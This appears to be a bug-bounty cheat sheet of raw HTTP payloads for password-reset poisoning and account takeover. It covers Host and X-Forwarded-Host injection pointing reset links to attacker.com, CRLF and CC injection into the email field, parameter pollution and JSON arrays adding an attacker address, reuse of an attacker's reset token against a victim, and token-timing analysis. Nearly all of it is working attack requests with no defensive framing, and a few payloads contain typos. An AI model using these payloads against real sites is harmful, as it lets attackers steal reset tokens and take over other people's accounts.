##### HOST HEADER INJECTION
````
POST /reset
HOST: attacker.com
````

##### OVERRIDE HOST HEADER
````
POST https://target.com/reset
HOST: attacker.com
````

##### AMBIGUATE HOST HEADER
````
POST /reset
HOST: target.com@attacker.com


HOST: target.com:@attacker.com
HOST: target.com: attacker.com
````
##### other techniques
````
POST @attacker.com/reset
HOST: target.com


POST /reset@attacker.com#
HOST: target.com
````
##### DOUBLE HOST
````
POST /reset
HOST: target.com
HOST: attacker.com


add space in the host
POST /reset
HOST: target.com
 HOST: attacker.com

````
##### X-FORWARDED-FOR
````
POST /reset
HOST: attacker.com
X-FORWARDED-HOST: attacker.com



POST /reset
HOST: attacker.com
X-FORWARDED-HOST: target.com


POST /reset
HOST: target.com
X-FORWARDED-HOST: attacker.com
Referer: https://attacker.com


POST /reset
HOST: target.com
X-FORWARDED-HOST: attacker.com
X-FORWARDED-FOR: attacker.com



POST /reset
HOST: target.com
X-FORWARDED-HOST: 0177.1
X-FORWARDED-FOR: 0177.1
````


##### Bypassing regex check on the host header
````
- target.com.attacker.com
- attacker.com/target.com
- attacker.com%23@target.com
- attacker.com%25%32%33@target.com


````
##### PARAMETER FUZZING USING BURP PARAMINER
 ````
 POST /reset
HOST: target.com

FUZZ 
 ````
 
 ##### SIGNING UP WITH TAMPERED EMAIL
 signup with email samsec@gmail.com.id.burpcollaborator.net and reset password for this email.
  we will recieve requests from internal server + SMTP connection details. and also we may get Internal headers + origin IP
   ````
   http://site.com/admin = (403)
   http://site.com/admin = (Headers + Origin IP = pwn)
   ````
 ````
 POST /reset
 
 email=test@123.burpcollaborator.net
 ````
 ##### EMAIL TAMPERING TO RECEIVE PASS RESET LINK IN ATTACKER EMAIL
 CRLF AND CARBON COPY INJECTION
 ````
 POST /reset
 HOST: target.com
 
 email=victim@gmail.com%0a%0dcc:attacker.com
 ````
 
 
 another methods
 - PARAMETER POLLUTION
```` email=victim@gmail.com&email=attacker@gmai.com````
 - SENDING TWO EMAIL AS ARRAY IN JSON AND ALSO CHANGING CONTENT-TYPE TO application/json(if the application is sending the email as json, then try sending the email as array)
    ```` 
    POST /reset
    HOST: target.com
    Content-Type: application/json
    
    
    {"email":["victim@gmail.com","attacker@gmail.com"]}

    ````
 - using separator , | OR  %20
  ```` email=victim@gmail.com,attacker@gmail.com ````
  
  #### APPENDING .JSON TO THE ENDPOINT
  this may give the token in response
  ````
  POST /reset.json
  HOST: target.com
  ````
  #### CRLF IN THE ROUTE
  ````
  POST /reset?%oa%odHost:attacker.com
  Host: target.com
  ````
#### CHANGING REQUEST METHOD
````
PUT /reset
host: target.com
Content-Type: application/json

email= victim@gmail.com
````
#### see response after sending email in reset endpoint , it may leak email and token

### /reset/changepass

put unused token of attacker@gmail.com after issuing reset pass in the field of victim's change pass request
````
POST /reset/change
Host: target.com

email=victim@gmail.com&token=[attacker_token]&old_pass=a&new_pass=b


````
#### Add Email parameter if there isn't email in request of reset/changepass
````
POST /reset/change
Host: target.com


added="email:victim@gmail.com"&token=token


````
### Observing the token that is generated for pass reset.
Send the password reset request link using intruder, so that the time duration between creating tokens is small and observe the difference in part of the pass reset.
Insert payload as  attacker@gmail.com, victim@gmail.com and run the intruder.
https://infosecwriteups.com/how-i-was-able-to-take-over-any-account-via-the-password-reset-functionality-ef1659f8b481 Read this article.

